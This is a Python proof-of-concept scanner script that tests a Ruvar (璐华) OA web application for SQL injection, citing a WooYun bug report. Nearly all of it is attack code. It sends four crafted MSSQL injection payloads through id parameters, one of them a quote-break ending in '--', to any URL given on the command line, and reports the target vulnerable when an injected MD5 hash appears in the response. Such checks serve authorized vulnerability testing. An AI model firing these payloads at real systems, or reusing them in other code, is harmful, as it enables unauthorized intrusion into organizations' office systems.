#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 璐华OA系统多处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0104430
author: Lucifer
description: ruvaroa多处SQL注入。
'''
import sys
import requests



class ruvar_oa_multi_sqli2_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/PersonalAffair/worklog_template_show.aspx?id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
                "/ProjectManage/pm_gatt_inc.aspx?project_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
                "/WorkPlan/plan_template_preview.aspx?template_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
                "/WorkPlan/WorkPlanAttachDownLoad.aspx?sys_file_storage_id=1%27AnD%20%28Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))%29%3E0%29--"]
        try:
            for payload in payloads:
                vulnurl = self.url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    return "[+]存在璐华企业版OA系统多处SQL注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = ruvar_oa_multi_sqli2_BaseVerify(sys.argv[1])
    testVuln.run()